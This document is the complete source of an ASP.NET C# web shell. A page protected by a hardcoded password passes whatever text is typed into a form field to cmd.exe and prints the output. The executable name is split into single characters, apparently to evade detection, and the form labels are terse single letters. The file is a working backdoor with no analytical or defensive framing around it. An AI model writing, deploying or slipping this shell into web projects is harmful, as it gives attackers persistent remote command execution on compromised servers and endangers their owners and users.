<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<html>
<script Language="c#" runat="server">
    private const string AUTHKEY = "RADIONil";
    private const string HEADER = "<html>\n<head>\n<title>command</title>\n<style type=\"text/css\"><!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n-->\n</style></head>\n<body>\n";
    private const string FOOTER = "</body>\n</html>\n";
    protected void Page_Load(object sender, EventArgs e)
    {
    }
    protected void bEX_Click(object sender, EventArgs e)
    {
    	if (txtAK.Text != AUTHKEY)
    	{
    	    return;
	    }
			
        Response.Write(HEADER);
        Response.Write("<pre>");
        Response.Write(Server.HtmlEncode(this.ExecuteCommand(tCM.Text)));
        Response.Write("</pre>");
        Response.Write(FOOTER);
    }
    private string ExecuteCommand(string command)
    {
        try
        {
            ProcessStartInfo PSI = new ProcessStartInfo();
            PSI.FileName = "c"+"m"+"d"+"."+"e"+"x"+"e";
            PSI.Arguments = "/c " + command;
            PSI.RedirectStandardOutput = true;
            PSI.UseShellExecute = false;
            Process prc = Process.Start(PSI);
            using (StreamReader streamReader = prc.StandardOutput)
            {
                string ret = streamReader.ReadToEnd();
                return ret;
            }
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
</script>

<html>
<head id="Head1" runat="server">
</head>
<body>
    <form id="fcm" runat="server">
    <div>
        <table>
            <tr>
                <td width="30">K:</td>
		        <td><asp:TextBox id="txtAK" runat="server"></asp:TextBox></td>
            </tr>
            <tr>
                <td width="30">C:</td>
                <td><asp:TextBox ID="tCM" runat="server" Width="820px"></asp:TextBox></td>
            </tr>
                <td>&nbsp;</td>
                <td><asp:Button ID="bEX" runat="server" OnClick="bEX_Click" Text="E" /></td>
            </tr>
        </table>
    </div>
    </form>
</body>
</html>